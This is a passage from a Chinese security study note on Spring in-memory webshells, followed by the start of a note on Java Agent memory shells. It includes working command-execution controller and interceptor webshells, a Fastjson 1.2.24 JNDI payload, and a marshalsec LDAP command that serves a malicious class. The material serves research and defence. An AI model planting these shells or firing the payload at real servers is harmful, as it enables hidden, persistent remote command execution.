之前学习了Tomcat的内存马，但是Spring也是比较常用的框架，所以大佬们重点研究了 SpringMVC，并实现了利用多种不同的技术手段，往内存中注入恶意 Webshell 代码的无文件攻击技术。 基础知识 具体可以过一下SpringMVC的开发，基于框架开发比较便捷和简单 Bean bean是Spring 框架的一个核心概念，它是构成应用程序的主干，并且是由 Spring IoC 容器负责实例化、配置、组装和管理的对象。 在Spring的IoC容器中，我们把所有组件统称为JavaBean，即配置一个组件就是配置一个Bean。 通俗来讲： bean 是对象 bean 被 IoC 容器管理 Spring 应用主要是由一个个的 bean 构成的 ApplicationContext ApplicationContext是 spring 中较高级的容器。和 BeanFactory 类似，它可以加载配置文件中定义的 bean，将所有的 bean 集中在一起，当有请求的时候分配 bean。 另外，它增加了企业所需要的功能，比如，从属性文件从解析文本信息和将事件传递给所指定的监听器。 ApplicationContext 接口继承了 BeanFactory 接口，并通过继承其他接口进一步扩展了基本容器的功能。 因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖。 IoC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。 其他 Root Context 和 Child Context Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext 中 ContextLoaderListener ContextLoaderListener 主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean DispatcherServlet DispatcherServlet 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例。 从下面的继承关系图中可以发现： DispatcherServlet 从本质上来讲是一个 Servlet（扩展了 HttpServlet )。 每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。 如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC容器，代表者 ApplicationContext。 Controller实现方式 要达到访问一个URL，访问到内存中的Webshell获得回显的效果，主要的方式如下： 在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境； 在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller； controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果 Controller技术实现 获取上下文的环境 大佬提供了4种方法： WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext()); WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); 我都试了一下，spring-boot-starter-parent 2.4.3中只有第四种方法可以成功获得Context 手动注册Controller 处理 URL 映射相关的类都实现了 HandlerMapping 接口 Spring 2.5 开始到 Spring 3.1 之前一般使用org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping 映射器 ； Spring 3.1 开始及以后一般开始使用新的org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping 映射器来支持@Contoller和@RequestMapping注解。 当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 bean。又因版本不同和较多的接口等原因，手工注册动态 controller 的方法不止一种。 方法一:registerMapping 在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式。 相关示例代码和解释如下： // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. 通过反射获得自定义 controller 中唯一的 Method 对象 Method method = (Class.forName(\"com.example.demo.Test\").getDeclaredMethods())[0]; // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\"com.example.demo.Test\").newInstance(), method); 这里只要让这些代码能够运行就行，我写到Controller里面的 com.example.demo.Test package com.example.demo; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class Test { public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { response.getWriter().write(\"ADD CONTROLLER\"); } } 效果 方法二:registerHandler 该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中。 我没成功，怀疑是spring版本问题 // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"com.example.demo.Test\").newInstance()); // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. 反射获得 registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(\"registerHandler\", String.class, Object.class); m1.setAccessible(true); // 4. 将 dynamicController 和 URL 注册到 handlerMap 中 m1.invoke(dh, \"/favicon\", \"dynamicController\"); 方法三：detectHandlerMethods 该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean。 仍然没成功 context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"com.example.demo.Test\").newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(\"detectHandlerMethods\", Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, \"dynamicController\"); webshell 就注入一个恶意的controller，然后这个controller中url对应的函数是执行命令的即可，简单示例 主要是给路由和恶意方法绑定即可 // com.example.demo.Test package com.example.demo; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.*; public class Test { public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { String cmd = request.getParameter(\"cmd\"); if(cmd != null){ Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); DataInputStream dataInputStream = new DataInputStream(inputStream); String disr = dataInputStream.readLine(); while ( disr != null ) { response.getWriter().write(disr); disr = dataInputStream.readLine(); } } else { response.getWriter().write(\"ADD CONTROLLER\"); } } } // 注册Controller WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. 通过反射获得自定义 controller 中唯一的 Method 对象 Method method = (Class.forName(\"com.example.demo.Test\").getDeclaredMethods())[0]; // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\"com.example.demo.Test\").newInstance(), method); 注意事项 不同的映射处理器 如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 RequestMappingHandlerMapping 实例的 bean，但会存在 DefaultAnnotationHandlerMapping 的实例 bean。 SpringBoot生命周期 上面过了一遍，感觉还是有点迷茫，可以调试一下spring的整个处理过程 一个请求到到应用层之前，需要经过那几个部分？是如何一步一步到到我们的Controller的? 编写一个正常的controller package com.example.demo; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(\"/test\") public class HelloController { @GetMapping(\"/hello\") public static String hello() { return \"123\"; } } 然后下断点，观察整个流程，查看堆栈信息 hello:16, HelloController (com.example.demo) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) doInvoke:197, InvocableHandlerMethod (org.springframework.web.method.support) invokeForRequest:141, InvocableHandlerMethod (org.springframework.web.method.support) invokeAndHandle:106, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation) invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation) handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation) handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method) doDispatch:1064, DispatcherServlet (org.springframework.web.servlet) ⭐️ doService:963, DispatcherServlet (org.springframework.web.servlet) processRequest:1006, FrameworkServlet (org.springframework.web.servlet) doGet:898, FrameworkServlet (org.springframework.web.servlet) service:655, HttpServlet (javax.servlet.http) service:883, FrameworkServlet (org.springframework.web.servlet) service:764, HttpServlet (javax.servlet.http) internalDoFilter:228, ApplicationFilterChain (org.apache.catalina.core) 【5】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilter:53, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【4】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:100, RequestContextFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【3】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:93, FormContentFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【2】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter) doFilter:119, OncePerRequestFilter (org.springframework.web.filter) internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core) 【1】 doFilter:163, ApplicationFilterChain (org.apache.catalina.core) invoke:202, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:542, AuthenticatorBase (org.apache.catalina.authenticator) invoke:143, StandardHostValve (org.apache.catalina.core) invoke:92, ErrorReportValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:357, CoyoteAdapter (org.apache.catalina.connector) service:382, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:893, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1723, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 可以看到通过多次的org.apache.catalina.core.ApplicationFilterChain#internalDoFilter过滤处理后，会进入到调度方法org.springframework.web.servlet.DispatcherServlet#doDispatch中 在调度方法中重新下断点，分析调度过程，执行到getHandler方法，从注释也可以看出来，是用来确定当前请求的处理程序，跟进 可以看到是遍历this.handlerMappings 这个迭代器中的mapping的getHandler方法处理http中的request请求 通过requestMappingHandlerMapping这个bean获取到了handler，但是怎么获取到的呢？我们继续跟进getHandler 可以看到最后返回的是executionChain，也就是我们刚才的那个handler，这个变量是怎么得来的，继续跟getHandlerExecutionChain() 在org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandlerExecutionChain中把所有拦截器都加入到chain中并返回 从上面的分析我们知道在哪加入拦截器了，然后在doDispatch()中继续向下分析，发现会调用applyPreHandler，字面意思翻译过来就是预处理 跟进，发现会执行每个拦截器的preHandle()方法 如果程序提前在调用的 Controller 上设置了 Aspect（切面），那么在正式调用 Controller 前实际上会先调用切面的代码，一定程度上也起到了 \"拦截\" 的效果。 总结一下，一个 request 发送到 spring 应用，大概会经过以下几个层面才会到达处理业务逻辑的 Controller 层： HttpRequest --> Filter --> DispactherServlet --> Interceptor --> Aspect --> Controller 上面我们实现了controller的内存马，同理，拦截器Interceptor的内存马也是可以实现的，实现方法类似，都是需要先获得上下文，然后注册进去。 Interceptor实现 从上面的分析，也可以看出，我们想要的目的，就是实现一个恶意的拦截器，然后让拦截器执行preHandler方法，其中preHandler方法的内容就是我们的恶意代码 Interceptor 的拦截范围其实就是Controller方法，它实际上就相当于基于AOP的方法拦截。因为Interceptor只拦截Controller方法，所以要注意，返回ModelAndView后，后续对View的渲染就脱离了Interceptor的拦截范围。 一个Interceptor必须实现HandlerInterceptor接口（可以看上面的分析图，interceptor的类就是HandlerInterceptor），可以选择实现preHandle()、postHandle()和afterCompletion()方法。preHandle()是Controller方法调用前执行，postHandle()是Controller方法正常返回后执行，而afterCompletion()无论Controller方法是否抛异常都会执行，参数ex就是Controller方法抛出的异常（未抛出异常是null）。 在preHandle()中，也可以直接处理响应，然后返回false表示无需调用Controller方法继续处理了，通常在认证或者安全检查失败时直接返回错误响应。在postHandle()中，因为捕获了Controller方法返回的ModelAndView，所以可以继续往ModelAndView里添加一些通用数据，很多页面需要的全局数据如Copyright信息等都可以放到这里，无需在每个Controller方法中重复添加。 拦截器代码 实现一个拦截器 package com.example.demo; import org.springframework.web.servlet.HandlerInterceptor; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class TestInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { response.getWriter().write(\"Interceptor test\"); return false; } } 正常注册拦截器 可以通过implements WebMvcConfigurer，重写其addInterceptors(InterceptorRegistry registry)方法 package com.example.demo; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; @Configuration public class InterceptorConfig implements WebMvcConfigurer { @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new TestInterceptor()).addPathPatterns(\"/test/hello\"); } } 效果 恶意注册拦截器 上面分析也看出来了，想要添加拦截器，就只需要动态添加到this.adaptedInterceptors数组中即可 所以我们的第一步是要获取到这个数组，而这个数组是在org.springframework.web.servlet.handler.AbstractHandlerMapping中实现的，AbstractHandlerMapping又是抽象类，所以我们需要找到它的实现类 下字段断点也可以找到它的实现类 org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping是一个不错的选择，可以通过context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\");获取实例，然后再反射获取到adaptedInterceptors变量，最后添加恶意的拦截器即可 这里我尝试失败了，还是怀疑spring版本问题 所以利用代码 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.handler.HandlerInterceptorAdapter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class TestInterceptor extends HandlerInterceptorAdapter { public TestInterceptor() throws NoSuchFieldException, IllegalAccessException, InstantiationException { // 获取context WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 从context中获取AbstractHandlerMapping的实例对象 org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(\"org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\"); // 反射获取adaptedInterceptors属性 java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\"); field.setAccessible(true); java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping); // 避免重复添加 for (int i = adaptedInterceptors.size() - 1; i > 0; i--) { if (adaptedInterceptors.get(i) instanceof TestInterceptor) { System.out.println(\"已经添加过TestInterceptor实例了\"); return; } } TestInterceptor aaa = new TestInterceptor(\"aaa\"); // 避免进入实例创建的死循环 adaptedInterceptors.add(aaa); // 添加全局interceptor } private TestInterceptor(String aaa){} @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String code = request.getParameter(\"code\"); // 不干扰正常业务逻辑 if (code != null) { java.lang.Runtime.getRuntime().exec(code); return true; } else { return true; }}} 应用场景 既然是通过执行 java 代码内存注入 webshell，那么一般需要通过 Spring 相关的代码执行漏洞才可以利用，例如较为常见的 Java 反序列漏洞、普通的 JSP 文件 Webshell 转换成无文件 Webshell等。 主要目的是在当前JVM的环境下执行代码即可 漏洞演示 以Fastjson 1.2.24 的反序列化漏洞为例吧，先配置好环境（JDK pom.xml com.alibaba fastjson 1.2.24 Controller package com.example.demo; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(\"/test\") public class HelloController { @PostMapping(\"/hello\") public String hello(String json) { JSONObject jsonObject = JSON.parseObject(json); return jsonObject.toJSONString(); } } 编写恶意的类 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.*; import java.lang.reflect.Method; public class Test { public Test() throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); Method method = Test.class.getDeclaredMethod(\"test\", HttpServletRequest.class, HttpServletResponse.class); PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, new Test(\"aaa\"), method); } private Test(String aa){ // 不这样的话，上面22行会一直重复创建Test()对象，导致内存溢出 } public void test(HttpServletRequest request, HttpServletResponse response) throws IOException { String cmd = request.getParameter(\"cmd\"); if(cmd != null){ Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); DataInputStream dataInputStream = new DataInputStream(inputStream); String disr = dataInputStream.readLine(); while ( disr != null ) { response.getWriter().write(disr); disr = dataInputStream.readLine(); } } else { response.getWriter().write(\"ADD CONTROLLER\"); } } } 编译成class文件 缺少依赖问题比较简单的解决方法，就是直接用IDEA编译的class，然后移动到其他目录即可 启动http服务 python3 -m http.server 8000 启动ldap服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Test 8088 然后用fastjson payload打过去 { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"b\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:8088/Test\", \"autoCommit\": true } } 效果 参考 深入浅出内存马(二) 之SpringBoot内存马（文末视频教学） 针对Spring MVC的Interceptor内存马 基于内存 Webshell 的无文件攻击技术研究 一文了解内存马： 最下面很多参考链接 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:02 "},"个人知识库/02.代码审计/01.Java安全/3.内存马/03.Java Agent 内存马.html":{"url":"个人知识库/02.代码审计/01.Java安全/3.内存马/03.Java Agent 内存马.html","title":"03.Java Agent 内存马","keywords":"","body":" 介绍 premain agentmain VirtualMachine 实现举例 Instrumentation 获取所有可修改类 修改类 ClassFileTransformer javassist 依赖 ClassPool CtClass CtMethod 示例 内存马 Spring Boot的Filter Java agent修改doFilter 拓展操作 查杀 风险 内存马复活 总览 介绍 Java agent是一种特殊的Java程序（Jar文件），它是Instrumentation的客户端。与普通Java程序通过main方法启动不同，agent并不是一个可以单独启动的程序，而必须依附在一个Java应用程序（JVM）上，与它运行在同一个进程中，通过Instrumentation API与虚拟机交互。 在注入内存马的过程中，我们可以利用java instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码。 java作为一种强类型的语言，不通过编译就不能够进行jar包的生成。而有了java agent技术，就可以在字节码这个层面对类和方法进行修改。同时，也可以把java agent理解成一种代码注入的方式。但是这种注入比起spring的aop更加的优美。 Java agent的使用方式有两种： 实现premain方法，在JVM启动前加载。 实现agentmain方法，在JVM启动后加载。 premain和agentmain函数声明如下，拥有Instrumentation inst参数的方法优先级更高： public static void agentmain(String agentArgs, Instrumentation inst) { ... } public static void agentmain(String agentArgs) { ... } public static void premain(String agentArgs, Instrumentation inst) { ... } public static void premain(String agentArgs) { ... } 第一个参数String agentArgs就是Java agent的参数。 第二个参数Instrumentation inst相当重要，inst 是一个 java.lang.instrument.Instrumentation 的实例，由 JVM 自动传入。java.lang.instrument.Instrumentation 是 instrument 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。 premain 这里简单的举例说明premain的使用，创建一个maven项目 编写premain函数 import java.lang.instrument.Instrumentation; public class Main { public static void premain(String agentArgs, Instrumentation inst){ for(int i=0; i 在resources目录下创建META-INF/MANIFEST.MF，并指定Premain-Class；要注意的是，最后必须多一个换行。 Manifest-Version: 1.0 Premain-Class: Main 然后打包成jar文件，在Project Structure -> Artifacts -> JAR -> From modules with dependencies中配置 默认选项就行 然后选择Build -> Build Artifacts -> Build 会在out/artifacts/javaagent_jar目录下生成对应的jar文件 随便找个jar文件示例，比如我们写个hello word，使用 -javaagent:agent.jar 参数执行 java -javaagent:javaagent.jar -jar hello.jar 可以发现在hello.jar输出Hello world之前就执行了，具体执行流程大致如下 然而这种方法存在一定的局限性：只能在启动时使用-javaagent参数指定。 在实际环境中，目标的JVM通常都是已经启动的状态，无法预先加载premain。相比之下，agentmain更加实用。 agentmain 写一个agentmain和premain差不多，只需要在META-INF/MANIFEST.MF中加入Agent-Class:即可。 Manifest-Version: 1.0 Agent-Class: AgentMain 不同的是，这种方法不是通过JVM启动前的参数来指定的，官方为了实现启动后加载，提供了Attach API。Attach API 很简单，只有 2 个主要的类，都在 com.sun.tools.attach 包里面。着重关注的是VitualMachine这个类。 需要依赖VitualMachine的loadAgent达到attach的目的 VirtualMachine 字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息、 loadAgent，attach 和 detach 等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。代理类注入操作只是它众多功能中的一个，通过loadAgent方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例。 具体的用法看一下官方给的例子大概就理解了： // com.sun.tools.attach.VirtualMachine // 下面的示例演示如何使用VirtualMachine: // attach to target VM VirtualMachine vm = VirtualMachine.attach(\"2177\"); // start management agent Properties props = new Properties(); props.put(\"com.sun.management.jmxremote.port\", \"5000\"); vm.startManagementAgent(props); // detach vm.detach(); // 在此示例中，我们附加到由进程标识符2177标识的Java虚拟机。然后，使用提供的参数在目标进程中启动JMX管理代理。最后，客户端从目标VM分离。 下面列几个这个类提供的方法： com.sun.tools.attach.VirtualMachine public abstract class VirtualMachine { // 获得当前所有的JVM列表 public static List list() { ... } // 根据pid连接到JVM public static VirtualMachine attach(String id) { ... } // 断开连接 public abstract void detach() {} // 加载agent，agentmain方法靠的就是这个方法 public void loadAgent(String agent) { ... } } 实现举例 Attach.java（找到进程，加载agentMain.jar） import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { if(args.length == 2){ String pid = args[0]; String jarName = args[1]; System.out.println(\"attach 的 pid ==> \" + pid); System.out.println(\"attach 的 jarName ==> \" + jarName); // 连接到JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // 加载agentmain virtualMachine.loadAgent(jarName); // 断开连接 virtualMachine.detach(); System.out.println(\"ends\"); } else{ System.out.println(\"至少2个参数\"); // 列出所有的jvm System.out.println(VirtualMachine.list()); } } } AgentMain.java（想要动态实现的代码） import java.lang.instrument.Instrumentation; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) { for(int i=0; i 可以写一起打包成一个jar，也可以分开打包成2个，问题都不大，只要MANIFST.MF没问题就行 Manifest-Version: 1.0 PreMain-Class: PreMain Agent-Class: AgentMain Main-Class: Attach 找一下想要操作的jvm的pid（也可以用上面的list()方法看到pid） 配置参数 java -jar attach.jar 63242 agentMain.jar 也可以手动在idea里面配置好 运行 转到我们想要attach的tomcat中看看效果 Instrumentation 刚才说了第二个参数Instrumentation inst相当重要，inst 是一个 java.lang.instrument.Instrumentation 的实例，由 JVM 自动传入。java.lang.instrument.Instrumentation 是 instrument 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。 下面列出这个类的一些方法，更加详细的介绍和方法，可以参照官方文档，也可以看这个类源码里面的说明 public interface Instrumentation { // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。 void addTransformer(ClassFileTransformer transformer, boolean canRetransform); // 删除一个类转换器 boolean removeTransformer(ClassFileTransformer transformer); // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。 void retransformClasses(Class... classes) throws UnmodifiableClassException; // 判断目标类是否能够修改。 boolean isModifiableClass(Class theClass); // 获取目标已经加载的类。 @SuppressWarnings(\"rawtypes\") Class[] getAllLoadedClasses(); ...... } 获取所有可修改类 先介绍getAllLoadedClasses和isModifiableClasses。顾名思义： getAllLoadedClasses：获取所有已经加载的类。 isModifiableClasses：判断某个类是否能被修改。 修改刚才的AgentMain.java，并编译 import java.lang.instrument.Instrumentation; public class AgentMain { public static void agentmain(String agentArgs, Instrumentation inst) { Class[] allLoadedClasses = inst.getAllLoadedClasses(); for (Class cls : allLoadedClasses){ System.out.println(cls.getName()); System.out.print(\"isModifiableClass: \"); System.out.println(inst.isModifiableClass(cls)?\"true\":\"false\"); } } } 修改Attach.java,并重新attach到jvm中 import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class Attach { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { // 列出所有的jvm System.out.println(VirtualMachine.list()); String pid = \"68588\"; String jarName = \"/Users/d4m1ts/d4m1ts/java/javaagent/out/artifacts/javaagent_jar/javaagent.jar\"; // 连接到JVM VirtualMachine virtualMachine = VirtualMachine.attach(pid); // 加载agentmain virtualMachine.loadAgent(jarName); // 断开连接 virtualMachine.detach(); System.out.println(\"ends\"); } } 运行后 得到了目标JVM上所有已经加载的类，并且知道了这些类能否被修改 修改类 使用addTransformer()和retransformClasses()可以篡改Class的字节码 首先再看一下这两个方法的声明： public interface Instrumentation { // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。 void addTransformer(ClassFileTransformer transformer, boolean canRetransform); // 删除一个类转换器 boolean removeTransformer(ClassFileTransformer transformer); // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。 void retransformClasses(Class... classes) throws UnmodifiableClassException; ...... } 在addTransformer()方法中，有一个参数ClassFileTransformer transformer。这个参数将帮助我们完成字节码的修改工作。 ClassFileTransformer ClassFileTransformer也是一个接口，它提供了transform方法，此方法的实现可能会转换提供的类文件并返回新的替换类文件。 接口注释简单概括一下： 